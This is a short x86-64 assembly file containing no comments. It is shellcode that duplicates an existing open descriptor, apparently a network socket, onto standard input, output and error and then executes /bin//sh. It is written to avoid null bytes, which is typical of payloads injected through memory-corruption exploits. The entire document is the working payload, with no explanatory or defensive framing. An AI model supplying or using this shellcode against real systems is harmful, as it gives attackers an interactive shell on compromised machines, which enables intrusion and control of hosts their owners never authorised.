	.globl _start
_start:
	xor  %rax, %rax
	xor  %rdi, %rdi
	movb $0x20, %al
	syscall
	mov  %rax, %rdi
	subb $0x1, %dil
	xor  %rsi, %rsi
	xor  %rax, %rax
	movb $0x21, %al
	syscall
	addb $0x1, %sil
	xor  %rax, %rax
	movb $0x21, %al
	syscall
	addb $0x1, %sil
	xor  %rax, %rax
	movb $0x21, %al
	syscall
	mov  $0x68732f2f6e69622f, %rdi
	xor  %rax, %rax
	push %rax
	push %rdi
	mov  %rsp, %rdi
	push %rax
	push %rdi
	mov  %rsp, %rsi
	movb $0x3b, %al
	xor  %rdx, %rdx
	syscall
